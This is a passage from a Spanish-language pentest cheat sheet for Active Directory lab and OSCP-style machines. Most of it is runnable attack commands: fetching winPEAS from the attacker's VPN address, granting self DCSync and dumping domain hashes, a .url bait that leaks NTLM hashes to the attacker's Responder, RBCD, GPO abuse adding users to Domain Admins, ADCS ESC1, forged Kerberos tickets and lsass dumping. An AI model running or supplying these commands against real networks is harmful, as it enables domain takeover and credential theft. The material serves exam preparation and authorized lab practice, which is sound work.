# Desde tu shell de Windows (evil-winrm), con la IP de VPN correcta:
Invoke-WebRequest -Uri "http://<TU_IP_TUN0>/winPEASx64.exe" -OutFile "C:\Windows\Temp\wp.exe"
C:\Windows\Temp\wp.exe > C:\Windows\Temp\winpeas_output.txt
```

### 🔴 Traer el archivo de vuelta a Kali — el bug de barras invertidas de evil-winrm

```
download C:\Windows\Temp\winpeas_output.txt
```
Esto puede fallar con `Error: Download failed. Check filenames or paths`, y el mensaje de info mostrará la ruta MAL formada (ej: `C:WindowsTempwinpeas_output.txt`, sin ninguna barra interna). **Causa:** los comandos `download`/`upload` de evil-winrm usan Readline (Ruby), que trata `\` como carácter de escape y se lo come.

**Solución — usa barras normales `/` SOLO para estos dos comandos:**
```
download C:/Windows/Temp/winpeas_output.txt
```
(Esto NO afecta a comandos normales de PowerShell como `Invoke-WebRequest`, que sí acepta `\` bien — el bug es específico de `download`/`upload`.)

### 🔴 El archivo descargado no se puede buscar con grep — problema de encoding

```bash
grep -i "autologon" winpeas_output.txt
# → no encuentra NADA, aunque el archivo tenga contenido real
```
**Causa:** PowerShell redirige (`>`) su salida en **UTF-16LE** por defecto. `grep` espera UTF-8/ASCII y no hace match aunque el texto esté ahí.

**Solución — convierte antes de buscar:**
```bash
file winpeas_output.txt
# → "Unicode text, UTF-16, little-endian text..." confirma el problema

iconv -f UTF-16LE -t UTF-8 winpeas_output.txt -o winpeas_utf8.txt
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
```

### Buscar credenciales de autologin y otros vectores
```bash
grep -i -A5 "autologon\|autologin\|DefaultUserName\|DefaultPassword" winpeas_utf8.txt
grep -i -B2 -A15 "Scheduled Tasks\|scheduled task" winpeas_utf8.txt
grep -i -B2 -A10 "SeImpersonate\|SeAssign\|AlwaysInstallElevated\|unquoted" winpeas_utf8.txt
```

> 🔴 **LECCIÓN CRÍTICA — el `DefaultUserName` del registro puede NO coincidir con el nombre real de la cuenta de Windows.** En un caso real: winPEAS mostró `DefaultUserName: DOMINIO\svc_loanmanager`, pero la cuenta REAL en el sistema era `svc_loanmgr` (confirmado por el path del directorio home, `C:\Users\svc_loanmgr`, que winPEAS también mostraba más arriba en el mismo archivo). El nombre largo en el registro puede ser un error de configuración real de la máquina, no tuyo.
> **Siempre cruza el `DefaultUserName` contra los directorios reales en `C:\Users\` (`dir C:\Users`) antes de gastar tiempo probando variantes de conexión con un nombre que puede estar mal.**

> 🔴 **También verifica el password por caracteres invisibles** (retorno de carro `\r` sobrante de la conversión UTF-16→UTF-8):
> ```bash
> grep "DefaultPassword" winpeas_utf8.txt | sed 's/DefaultPassword\s*:\s*//' | tr -d '\r'
> ```
> Compara el resultado limpio contra lo que has estado usando — un `\r` invisible al final hace que el password "se vea igual" pero falle la autenticación.

> 🔴 **Verificar la clave del registro DIRECTAMENTE (`reg query`) puede fallar con `WinRMAuthorizationError` aunque `whoami` funcione bien** — `HKLM\...\Winlogon` a veces requiere privilegios más altos que los del usuario actual, incluso si ese mismo usuario puede ejecutar otros comandos sin problema. No es un error general de tu sesión, es específico de esa clave protegida. En ese caso, tu única fuente confiable queda siendo el archivo ya generado por winPEAS (que a veces sí puede leerla por un método distinto).

---

## FASE 8 — Escalada por cadena de ACL (cuando el camino tiene VARIOS saltos de grupo)

Caso real completo — cuando tu usuario no tiene un ACL directo, sino una cadena de membresías anidadas terminando en un grupo con WriteDacl sobre el dominio:

```
tu_usuario → MemberOf → Grupo A → MemberOf → Grupo B
   → GenericAll → Grupo C (ej: "Exchange Windows Permissions")
   → WriteDacl → EL DOMINIO
```

```bash
# Paso 1 — únete al grupo intermedio que tiene el WriteDacl
net rpc group addmem "<GRUPO>" "<tu_usuario>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>

# SIEMPRE verifica que de verdad se aplicó — net rpc puede fallar SIN mostrar error:
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

> 🔴 **`net rpc group addmem` puede "funcionar" sin error visible y NO aplicar el cambio realmente** — pasa cuando el privilegio viene de membresía anidada, no de un permiso directo tuyo. **Verifica SIEMPRE con `net rpc group members` después, nunca asumas éxito por falta de error.**

**Alternativa que SÍ funciona cuando `net rpc` falla silenciosamente — LDAP directo:**
```bash
# 1. Confirma el DN exacto del grupo objetivo (no asumas la OU)
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(cn=<GRUPO>)" distinguishedName

# 2. Confirma el DN exacto de tu propio usuario
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(sAMAccountName=<tu_usuario>)" distinguishedName

# 3. LDIF con AMBOS DN exactos
cat <<EOF > add_member.ldif
dn: <DN_EXACTO_DEL_GRUPO>
changetype: modify
add: member
member: <DN_EXACTO_DE_TU_USUARIO>
EOF

# 4. Aplica
ldapmodify -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -f add_member.ldif

# 5. Verifica de nuevo
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

```bash
# Paso 2 — auto-concédete DCSync (GetChanges + GetChangesAll)
# INMEDIATAMENTE después del paso 1, SIN esperar.
impacket-dacledit -action write -rights DCSync -principal <tu_usuario> -target-dn "DC=<dom>,DC=<tld>" <dominio>/<tu_usuario>:<tu_pass> -dc-ip <DC_IP>
# Éxito: "[*] DACL modified successfully!"
```

> 🔴 **LECCIÓN DE TIMING (real, costó varios intentos):** la membresía de grupo puede tardar en propagarse al token de sesión, o revertirse en labs con protección. Si el Paso 2 falla con `INSUFF_ACCESS_RIGHTS` la primera vez, **repite el Paso 1 y ejecuta el Paso 2 justo después, sin dejar pasar tiempo entre medio.** No asumas que la membresía "ya quedó" solo porque la viste una vez — vuelve a verificar (paso 5) cada vez antes de reintentar el dacledit.

> 🔴 **CONFLICTO DE PYTHON — `impacket-dacledit` (o `nxc`, o cualquier herramienta que use `dns.resolver`) puede fallar con un traceback largo** terminando en `ImportError: cannot import name 'asn1' from 'cryptography.hazmat'`. **Causa real:** instalar otra herramienta con `pip install --break-system-packages` (ej: bloodyAD) actualiza `cryptography` a una versión incompatible con `service-identity`/`aioquic`, y esto CONTAMINA CUALQUIER otra herramienta de Python que dependa de esa cadena — no solo la que instalaste.
>
> **NO persigas versiones exactas de `cryptography` a mano** (bajarla rompe otra herramienta, subirla rompe otra distinta — es un agujero sin fondo). Dos soluciones reales:
> ```bash
> # Solución A — si el conflicto afecta a UNA herramienta puntual (ej: dacledit), aísla en venv:
> python3 -m venv ~/venv-impacket
> source ~/venv-impacket/bin/activate
> pip install impacket
> # corre el comando de impacket aquí dentro
> deactivate
>
> # Solución B — si el conflicto ya se propagó a herramientas del SISTEMA (ej: nxc dejó de
> # funcionar), la causa es una versión de cryptography instalada en tu ruta de usuario
> # (~/.local/lib/python.../site-packages/) con prioridad sobre la del sistema. Elimínala:
> pip uninstall cryptography --break-system-packages -y
> nxc --help   # confirma que volvió a funcionar
> ```

```bash
# Paso 3 — DCSync real
impacket-secretsdump -just-dc <dominio>/<user>:<pass>@<DC_IP>
```
**Si da `ERROR_DS_DRA_BAD_DN`:** casi siempre significa que los permisos de DCSync todavía no están bien aplicados — vuelve al Paso 2, no es un error de sintaxis de este comando.

> 🔴 **Si el dump completo no muestra el hash de Administrator** (aparecen otras cuentas pero no esa), pide la cuenta específica directamente en vez de asumir que el volcado completo la incluye siempre:
> ```bash
> impacket-secretsdump -just-dc-user Administrator <dominio>/<user>:<pass>@<DC_IP>
> ```

---

## FASE 8b — Vector alternativo: Azure AD Connect / ADSync (cuando NO hay DCSync ni cadena ACL)

Caso real completo (máquina Monteverde). Si tu usuario no tiene ningún edge útil hacia Domain Admin en BloodHound, pero SÍ tiene acceso a una máquina que corre **Azure AD Connect** (sincroniza el AD on-prem con Azure AD), esa máquina guarda credenciales de una cuenta MSOL con privilegios altos, **descifrables** por diseño — es un vector documentado (metodología de Xpnsec/adconnectdump).

### Cómo llegar hasta ahí

```bash
# 1. Password spraying probando usuario = password (común en cuentas de servicio
#    mal configuradas, vale la pena probarlo siempre junto al spray normal)
nxc smb <IP> -u users.txt -p users.txt --no-bruteforce
# o generando un archivo de passwords idéntico a la lista de usuarios:
cp users.txt passwords_as_users.txt
nxc smb <IP> -u users.txt -p passwords_as_users.txt
```

```bash
# 2. Con la credencial que funcione, revisa shares — busca archivos .xml
#    (Azure AD Connect a veces deja exports de PowerShell con credenciales
#    en texto plano, tipo PSADPasswordCredential)
smbclient //<IP>/<share_con_READ> -U '<user>'
#   cd <carpeta_de_usuario> ; ls ; get archivo.xml

cat archivo.xml
# Busca <S N="Password">...</S> — a veces está literalmente en texto plano
# dentro de un objeto serializado de PowerShell (PSADPasswordCredential).
```

### Confirmar que la máquina corre Azure AD Connect

Una vez con shell (evil-winrm) en la máquina que tiene el servicio:
```powershell
Test-Path "C:\Program Files\Microsoft Azure AD Sync\"
Get-Service -Name ADSync
# Si "Running", la base de datos LocalDB del sync está activa.
```

### Extraer y descifrar las credenciales de la cuenta de sync

Azure AD Connect guarda en una base LocalDB (`ADSync`) las credenciales, cifradas con una clave que la propia máquina puede leer (por diseño, ya que necesita descifrarlas para operar). Herramientas como `AdDecrypt.exe`/scripts equivalentes automatizan esto:

```bash
# Sube el script/binario de descifrado a la máquina (mismo método que winPEAS: Fase 7)
# Ejemplo real de script usado: decrypt.ps1 (ajusta la data source si el primer intento falla)
```
```powershell
.\decrypt.ps1
# Si falla contra "(localdb)\.\ADSync", puede necesitar la data source alternativa
# "Data Source=localhost;Initial Catalog=ADSync;Integrated Security=True" — el script
# suele intentar varias rutas de conexión automáticamente.
```

**Resultado esperado:** el script te devuelve directamente el usuario y password en texto plano de la cuenta que Azure AD Connect usa para sincronizar — típicamente `Administrator` o una cuenta de servicio con privilegios de dominio equivalentes:
```
Domain: <DOMINIO>
Username: administrator
Password: <PASSWORD_EN_TEXTO_PLANO>
```

Con eso, salta directo a Fase 9 (Pass-the-Hash o login directo con la password).

> **Cuándo pensar en este vector:** si enumeraste el dominio completo, corriste BloodHound, y no hay ningún edge útil (ni ACL, ni Kerberoastable jugoso, ni sesión aprovechable) — pero SÍ ves `Azure Admins` como grupo del dominio, o encuentras rutas/archivos que mencionen "Azure AD Sync" o "AAD_" en nombres de cuenta (como `AAD_987d7f2f57d2`, un patrón típico de cuenta de sincronización) — es una señal fuerte de que Azure AD Connect está en juego, y vale la pena buscar la máquina que lo corre.

---

## FASE 9 — Pass-the-Hash final y captura de flags

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH>
# Si WinRM no coopera: impacket-psexec <dominio>/Administrator@<DC_IP> -hashes :<NT_HASH>
```

```cmd
:: Recuerda: cmd.exe/PowerShell de Windows, NO bash
:: cat NO existe → usa type       ls NO es nativo → usa dir
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<usuario_inicial>\Desktop\user.txt

:: Si una flag "no es aceptada" al enviarla, sospecha de caracteres invisibles:
certutil -encodehex C:\Users\Administrator\Desktop\root.txt tmp.hex
type tmp.hex
```

> 🔴 **Si `dir` en cmd muestra warnings de "Decoding error, consider running chcp.com"** (típico con `impacket-wmiexec`) — no afecta el contenido real del archivo, es solo un problema de codificación de caracteres en la consola. El `type` del archivo sigue siendo confiable.

> **Si el lab/examen pide específicamente el hash NTLM** (no solo la flag en texto) **de una cuenta LOCAL** (no de dominio) → usa el volcado local de SAM/SYSTEM de la Fase 5g (`reg save` + `secretsdump ... LOCAL`), no DCSync — son técnicas distintas para objetivos distintos.

---

## FASE 2c — NTLM theft / forced authentication (share escribible, SIN credenciales)

> Vector real de **Vault** (writeup: [`writeups/vault-gpo-writeup.md`](writeups/vault-gpo-writeup.md)). Si tienes **escritura** en un share que alguien navega, dejas un cebo que fuerza a Windows a autenticarse contra tu Kali y capturas el **Net-NTLMv2**. Aquí Responder se usa como **listener pasivo** (modo análisis), NO como poisoning LLMNR/NBT-NS — la autenticación la provoca el propio cebo. Aun así, confirma la política del examen antes de usarlo.

```bash
# 1. Levanta Responder como listener (SMB/HTTP ON)
sudo responder -I tun0
#    Los hashes se guardan en /usr/share/responder/logs/ — no te fíes solo de la pantalla
#    (solo imprime cada hash único UNA vez por sesión).

# 2. Crea el cebo .url — el truco está en IconFile apuntando a una UNC hacia ti.
#    Para pintar el icono, el Explorer sale por SMB a esa ruta → suelta el hash.
cat > '@cebo.url' <<'EOF'
[InternetShortcut]
URL=http://x/
WorkingDirectory=x
IconFile=\\<IP_TUN0>\share\icon.ico
IconIndex=1
EOF
#    El '@' al inicio del nombre lo coloca arriba del todo (se renderiza antes).

# 3. Súbelo a la RAÍZ del share (no en una subcarpeta — ahí no dispara)
smbclient //<IP>/<share> -U '<user>'
#   smb: \> put '@cebo.url'

# 4. Espera la captura y crackea
watch -n 5 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt 2>/dev/null'
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

> 🔴 **Dos confusiones que cuestan tiempo** (lección de **Heist**, [`writeups/heist-writeup.md`](writeups/heist-writeup.md)):
> - **Un navegador NO habla SMB/UNC.** Si fuerzas la autenticación a través de un Chromium headless (SSRF), el cebo debe ser una URL `http://<KALI>/x`, no `\\<KALI>\x`. El UNC solo lo abre el Explorer/cliente SMB.
> - **`tcpdump` NO captura el hash**, solo te confirma si el tráfico del target llega a tu Kali (`sudo tcpdump -i tun0 host <IP>`). Quien captura es Responder. Son roles distintos.

> Otros cebos: `.lnk`, `.scf` (parcheado en Windows modernos), `.library-ms` (CVE-2025-24071, ver FASE 2b). El `.url` con `IconFile` es el más fiable hoy.

---

## FASE 5i — gMSA: leer la contraseña de una cuenta de servicio gestionada

> Vector de **Heist**. Una **gMSA** (group Managed Service Account) tiene su contraseña gestionada y rotada por el DC — nadie la sabe, pero ciertos grupos pueden **leerla** (en forma de hash NT). Si tu usuario está en `PrincipalsAllowedToReadPassword`, la robas.

```bash
# Un solo comando con nxc:
nxc ldap <IP> -u <user> -p '<pass>' --gmsa
# Salida:
#   Account: svc_apache$   NTLM: d555...c6a1
#   PrincipalsAllowedToReadPassword: ['DC01$', 'Web Admins']   ← ¿estás en ese grupo?

# Con el hash NT de la gMSA → Pass-the-Hash (no necesitas la clave en claro):
nxc smb   <IP> -u 'svc_apache$' -H d555...c6a1
evil-winrm -i <IP> -u 'svc_apache$' -H d555...c6a1
```
> El `$` final del nombre de la cuenta de máquina/gMSA va **entre comillas simples** para que la shell no lo interprete. Alternativa: `impacket-gMSADumper` / `bloodyAD get object <gmsa$> --attr msDS-ManagedPassword`.

---

## FASE 8d — RBCD (Resource-Based Constrained Delegation)

> Escalada de **ResourceD** (writeup: [`writeups/resourced-writeup.md`](writeups/resourced-writeup.md)). **Requisitos:** (1) poder crear una cuenta de máquina (`SeMachineAccountPrivilege`, o `ms-DS-MachineAccountQuota > 0`, por defecto 10), y (2) poder escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` sobre el equipo objetivo (`GenericAll`/`GenericWrite`/`WriteDacl` sobre `DC$` — confírmalo en BloodHound).

```bash
# Prep: Kerberos es estricto con DNS y reloj
echo '<IP> dc.dominio.local dominio.local DC' | sudo tee -a /etc/hosts
sudo ntpdate <IP>        # evita KRB_AP_ERR_SKEW (o usa faketime)

# 1. Crear una máquina controlada por ti
impacket-addcomputer dominio.local/<user> -hashes :<NThash> \
  -computer-name 'FAKE01$' -computer-pass 'Fake1234!' -dc-ip <IP>

# 2. Escribir la delegación en el objetivo (el DC confía en FAKE01$)
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write \
  dominio.local/<user> -hashes :<NThash> -dc-ip <IP>

# 3. Pedir un ticket de servicio suplantando a Administrator (S4U2Self + S4U2Proxy)
impacket-getST -spn 'cifs/dc.dominio.local' -impersonate Administrator \
  'dominio.local/FAKE01$:Fake1234!' -dc-ip <IP>
#   El SPN va con FQDN, NUNCA con IP (Kerberos valida por nombre).

# 4. Usar el ticket → SYSTEM en el DC
export KRB5CCNAME=Administrator@cifs_dc.dominio.local@DOMINIO.LOCAL.ccache
impacket-psexec -k -no-pass dc.dominio.local
#   Variantes con el mismo ticket: impacket-wmiexec -k -no-pass ... / impacket-secretsdump -k -no-pass ...
```
> **Pista de que este es el camino:** `whoami /priv` muestra `SeMachineAccountPrivilege` **y** BloodHound da `GenericAll`/`GenericWrite` sobre el objeto del DC (o de otra máquina). Limpieza: `impacket-rbcd -action flush` y borra `FAKE01$`.

---

## FASE 8e — GPO abuse (editar una GPO que aplica al DC)

> Escalada de **Vault**. Si tienes permiso de edición (`GpoEdit` / `GpoEditDeleteModifySecurity` / arista `WriteGPLink` en BloodHound) sobre una GPO que aplica al DC — típicamente la **Default Domain Policy** (GUID fijo `31B2F340-016D-11D2-945F-00C04FB984F9`) — inyectas una tarea inmediata que corre **como SYSTEM**.

```bash
# Enumerar GPOs escribibles (desde shell Windows, módulo GroupPolicy):
#   Get-GPO -All | %{ Get-GPPermission -Guid $_.Id -All } |
#     ? { $_.Permission -match 'Edit' -and $_.Trustee.Name -eq $env:USERNAME }

# Abusar desde Kali con pyGPOAbuse (con pass o hash):
git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse
python3 pygpoabuse.py dominio.local/<user>:'<pass>' \
  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
  -command 'net group "Domain Admins" <user> /add /domain' \
  -taskname 'Update' -description 'Update'
```
```powershell
# Alternativa desde shell Windows: SharpGPOAbuse (evita grupos con espacios → usa Administrators)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author dominio\<user> `
  --Command "cmd.exe" --Arguments "/c net localgroup Administrators <user> /add" --GPOName "Default Domain Policy"

# Aplicar y RECONECTAR (el token solo recoge el grupo nuevo en un login nuevo):
gpupdate /force
```
> En un DC, el grupo local **Administrators** equivale a admin del dominio y se escribe sin las comillas problemáticas de `"Domain Admins"`.

---

## FASE 8f — AD CS ESC1 (plantilla de certificado vulnerable)

> Complemento de la FASE 8c (ESC16). **ESC1** = una plantilla permite que un usuario de bajo privilegio pida un certificado **especificando un SAN arbitrario** (ej: `administrator@dominio.local`) → autenticas como esa identidad.

```bash
# 1. Encontrar plantillas vulnerables
certipy find -u <user>@dominio.local -p '<pass>' -dc-ip <IP> -vulnerable -stdout
#    Busca "ESC1" y el nombre de la plantilla + la CA.

# 2. Pedir un cert suplantando a Administrator vía SAN (-upn)
certipy req -u <user>@dominio.local -p '<pass>' -dc-ip <IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE>' -upn administrator@dominio.local
#    Genera administrator.pfx

# 3. Autenticar con el cert → hash NT de Administrator (o TGT)
certipy auth -pfx administrator.pfx -dc-ip <IP>
#    → hash NT → Pass-the-Hash al DC
```
> Si `certipy` no detecta la vuln que esperas, **actualízalo** antes de descartar (`pip install certipy-ad --upgrade --break-system-packages`).

---

## FASE 9b — Overpass-the-Hash y tickets (persistencia, OPCIONAL en OSCP)

> Útiles si el vector lo pide; **Golden/Silver Ticket son más de persistencia** que de camino — en OSCP rara vez son el único camino, pero conviene reconocerlos.

```bash
# Overpass-the-Hash: hash NTLM → ticket Kerberos (cuando NTLM está bloqueado pero Kerberos no)
impacket-getTGT dominio.local/<user> -hashes :<NThash>
export KRB5CCNAME=<user>.ccache
impacket-psexec -k -no-pass dc.dominio.local

# Golden Ticket: con el hash de krbtgt (tras DCSync) forjas un TGT de cualquier usuario
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain dominio.local Administrator
#   -> Administrator.ccache ; export KRB5CCNAME y usa psexec -k -no-pass

# Silver Ticket: con el hash de una cuenta de servicio forjas un TGS para ESE servicio concreto
impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain dominio.local -spn cifs/host.dominio.local Administrator
```
> El `domain-sid` lo sacas con `impacket-lookupsid` o `nxc ... --rid-brute`. Estos dos no "encuentran" el camino, lo **mantienen** una vez ya tienes el hash de krbtgt/servicio.

---

## FASE 5j — Volcado de credenciales en memoria (lsass) y resumen de dumps

Una vez con SYSTEM/admin local, además de SAM (FASE 5g) puedes volcar credenciales **vivas** de memoria:

```bash
# Remoto, con credenciales de admin local:
nxc smb <IP> -u Administrator -p '<pass>' --lsa          # secretos LSA
nxc smb <IP> -u Administrator -p '<pass>' --sam          # hashes locales (SAM)
nxc smb <IP> -u Administrator -H <hash>   -M lsassy      # lsass → creds en claro/NTLM

# Desde shell Windows (mimikatz, si lo subes):
#   privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam
```
| Qué quiero | Fuente | Comando |
|------------|--------|---------|
| Hashes locales de esa máquina | SAM + SYSTEM | `reg save` + `secretsdump ... LOCAL`, o `nxc --sam` |
| Credenciales vivas en memoria | lsass | `nxc -M lsassy`, mimikatz `sekurlsa::logonpasswords` |
| TODOS los hashes del dominio | ntds.dit (DCSync) | `secretsdump dominio/user@DC -just-dc` |
| ntds.dit desde un backup en un share | ntds.dit + SYSTEM | `secretsdump -ntds ntds.dit -system SYSTEM local` |

> **Patrón de backup de AD** (ResourceD): si encuentras `ntds.dit` + el hive `SYSTEM` en un share, vuelcas **offline** todos los hashes. Como el backup suele estar viejo, **no adivines cuál sirve**: hash-spray todos y deja que el DC marque los `[+]` válidos (`nxc smb <IP> -u users.txt -H hashes.txt --continue-on-success | grep '\[+\]'`).

---

## Resumen del flujo completo

```
nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
   → enumeración SIN creds (null session, RPC anónimo, lookupsid, shares, WEB si hay puerto 80)
   → ¿GPP/Groups.xml? → gpp-decrypt → credencial #1
   → ¿ZIP/PFX en un share? → zip2john/pfx2john + john → openssl extrae cert+key
     → evil-winrm -c cert.pem -k key.pem -S (autenticación por certificado)
   → revisa TAMBIÉN: notas de onboarding en shares, campo "Description" de usuarios
     (nxc --users), scripts .ps1 con creds hardcodeadas — cada cred nueva → probar
     contra shares nuevos (patrón: cred → share nuevo → script → otra cred → shell)
   → enumeración CON creds (nxc, LDAP con filtros, RPC — CRUZA AMBAS fuentes)
   → BloodHound (verificar arranque con pg_lsclusters si no responde)
   → priorizar camino: ACL > Kerberos > Sesión
   → ejecutar técnica del camino elegido → nueva credencial/acceso
   → movimiento lateral (evil-winrm/psexec/wmiexec — confirmar puerto Y si es 5986 usar -S)
   → si WinRM autoriza mal: sospechar grupo "Remote Management Users" o ACCOUNTDISABLE
   → ¿carpetas Credentials\/Protect\<SID>\ en vez de flag directa? → DPAPI (impacket-dpapi
     masterkey + credential) — si evil-winrm download falla (EstandardError) con esos
     archivos Hidden+System, usa Sliver C2 como shell alternativa solo para ese paso
   → revisar ConsoleHost_history.txt (PowerShell) — a veces hay password en texto plano
   → winPEAS (servir desde carpeta correcta, IP de VPN, convertir UTF-16→UTF-8 antes de grep)
   → ¿autologin encontrado? CRUZAR contra directorios reales en C:\Users (nombre puede diferir)
   → repetir BloodHound con el nuevo usuario si hace falta
   → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify/bloodyAD + dacledit)
   → ¿GenericWrite/GenericAll sobre una CUENTA (no grupo)? → Shadow Credentials
     (certipy shadow auto) en vez de resetear password
   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps), gMSA (nxc --gmsa → hash NT),
     Azure AD Connect (grupo "Azure Admins", cuentas AAD_*, servicio ADSync),
     AD CS (certipy find -vulnerable → ESC1 vía SAN / ESC16 vía UPN → certipy auth),
     RBCD (SeMachineAccountPrivilege + escritura sobre DC$ → addcomputer/rbcd/getST),
     o GPO abuse (GpoEdit sobre la Default Domain Policy → pyGPOAbuse → tarea SYSTEM)
   → Pass-the-Hash al DC (o password de LAPS) con el hash/pass del Administrator
   → flags (user.txt / root.txt / proof.txt) — Administrator lee CUALQUIER carpeta,
     no necesitas ser el usuario dueño de la flag
```

## Checklist mental de "cuando algo no funciona" (aplica en CUALQUIER fase)

1. **¿2+ protocolos distintos rechazan la misma credencial?** → sospecha del dato copiado (usuario o password), no de la técnica. Reescribe a mano.
2. **¿Un comando "no da error" pero tampoco parece haber funcionado?** → verifica el resultado explícitamente, nunca asumas éxito por ausencia de error (`net rpc addmem`, membresías, etc.).
3. **¿Herramienta de Python rota con traceback de `cryptography`/`aioquic`?** → conflicto de dependencias de otra instalación reciente, no tu comando. Usa venv aislado o `pip uninstall cryptography --break-system-packages -y`.
4. **¿grep no encuentra nada en un archivo que "debería" tenerlo?** → revisa el encoding con `file archivo.txt` (busca UTF-16 de PowerShell) y conviértelo con `iconv` primero.
5. **¿WinRM conecta pero no ejecuta nada?** → autenticación ok, autorización no — el usuario no está en "Remote Management Users". Cambia de protocolo (SMB/psexec/wmiexec).
6. **¿Ninguna variante de conexión funciona con un usuario "confirmado"?** → cruza el nombre contra otra fuente (directorio real en `C:\Users`, lista de RPC vs LDAP) — el dato de origen puede estar mal o desactualizado.
7. **¿BloodHound no muestra NINGÚN camino útil a Domain Admin?** → antes de rendirte, revisa shares en busca de archivos `.xml`/`.config`/`.zip`/`.pfx` con credenciales filtradas, y busca indicios de Azure AD Connect (grupo "Azure Admins", cuentas `AAD_*`, servicio `ADSync`) o de LAPS (`nxc ldap -M laps`) — no todo pasa por ACLs o Kerberos.
8. **¿WinRM da `ConnectTimeoutError` o similar al conectar?** → antes de asumir que es un problema de red, confirma qué puerto está REALMENTE abierto (`nmap -p5985,5986 <IP>`). Si es 5986 en vez de 5985, agrega `-S` (SSL) al comando de evil-winrm.
9. **¿Tienes shell de Administrator pero la flag "no existe" en la ruta que probaste?** → Administrator puede leer la carpeta de CUALQUIER usuario del sistema, la flag no tiene que estar en `C:\Users\Administrator\` — revisa `dir C:\Users` para ver qué otras cuentas existen y busca ahí.
10. **¿`whoami /priv` muestra un privilegio interesante (`SeBackupPrivilege`, etc.) pero `type`/`download` da "Access denied" o trae el archivo vacío?** → un privilegio "Enabled" NO se aplica solo; necesitas una herramienta que invoque explícitamente esa semántica (ej: `robocopy /B` para SeBackupPrivilege). No descartes el privilegio solo porque el comando obvio falló.
11. **¿`certipy` no encuentra la vulnerabilidad que esperabas, o falla de forma rara?** → actualiza a la versión más reciente antes de asumir que la técnica no aplica (`pip install certipy-ad --upgrade --break-system-packages`); versiones viejas no detectan correctamente varias ESC (incluida ESC16).
12. **¿Un comando de Kerberos/certipy falla por error de tiempo/reloj (`KRB_AP_ERR_SKEW` o similar)?** → antepón `faketime` sincronizado con el reloj del DC al comando completo: `faketime "$(ntpdate -q <DC_IP> | awk '{print $1" "$2}')" <comando>`. Los certificados son mucho más estrictos con la hora que NTLM normal.
13. **¿`get`/`cat` de un archivo da "not found" aunque `ls` lo muestre claramente?** → el nombre probablemente tiene espacios; ponlo completo entre comillas (`get "archivo con espacios.txt"`, `cat 'archivo con espacios.txt'`). Y no olvides mirar la columna "Description" cuando corras `nxc --users` — a veces la credencial está ahí, no en ningún archivo.
14. **¿Tu terminal se queda colgada en `dquote>` o `>` al escribir un comando con un password?** → usaste comillas dobles con un password que tiene `!`/`$`/`` ` ``. Cierra con una comilla sola + Enter (o Ctrl+C), y reintenta TODO el bloque de usuario/password con comillas SIMPLES `'...'`.
15. **¿WinRM da `WinRMAuthorizationError` incluso después de confirmar que el usuario SÍ está en "Remote Management Users"?** → puede ser la cuenta deshabilitada (`ACCOUNTDISABLE` en `userAccountControl`), no un problema de grupo. Verifica desde otra cuenta con acceso y, si tienes ACL suficiente, quita la bandera con `bloodyAD ... remove uac '<cuenta>' -f ACCOUNTDISABLE`.
16. **¿evil-winrm `download`/`upload` falla con `EstandardError` (sí, con ese typo) en vez de `StandardError`?** → bug conocido de evil-winrm con archivos Hidden+System (típico de blobs/masterkeys DPAPI). No es tu sintaxis. Usa Sliver C2 como shell alternativa solo para esa transferencia (Fase 6b).
17. **¿Encontraste carpetas `Credentials\` o `Protect\<SID>\` con archivos dentro, en vez de una flag directa?** → es DPAPI (Fase 5h): un usuario guardó la credencial de OTRA cuenta en su Credential Manager. Necesitas el blob (`Credentials\`) Y la masterkey (`Protect\<SID>\`), y la password del usuario dueño para descifrar la masterkey con `impacket-dpapi masterkey`, antes de descifrar el blob con `impacket-dpapi credential`.
18. **¿`whoami /priv` muestra `SeImpersonatePrivilege` en `Enabled`?** → es privesc local directo a SYSTEM vía PrintSpoofer (Fase 6c), no tiene nada que ver con AD/dominio. Revisa esto SIEMPRE apenas tengas shell nueva, antes de cualquier otra cosa — es gratis y muy común en cuentas de servicio/aplicación.
19. **¿Dejaste un placeholder tipo `<TU_IP_VPN>`, `<NOMBRE_EXACTO>` o `<RUTA_MYSQL.EXE>` literal dentro de un comando?** → revisa el output con cuidado antes de reintentar: un comando con un placeholder sin sustituir a veces "corre" sin error visible (sobre todo si usa `<`/`>` dentro de una ruta en `cmd.exe`, que los interpreta como redirección y rompe todo silenciosamente) y el archivo de salida queda con contenido viejo de una ejecución anterior, lo cual puede confundirte pensando que el comando nuevo no hizo nada.
20. **¿Estás pivotando con proxychains y `nmap`/`ntpdate`/`bloodhound-python` fallan o dan "todo filtered"/timeout?** → proxychains solo tuneliza TCP, no UDP, y `nmap` con paralelismo alto da falsos negativos sobre un túnel SOCKS de un solo canal. Usa `nc -nvz`/`nxc` para confirmar puertos, `faketime` con timestamp calculado en vez de `ntpdate`, y `--dns-tcp` en `bloodhound-python` (Fase 6d tiene el detalle completo).
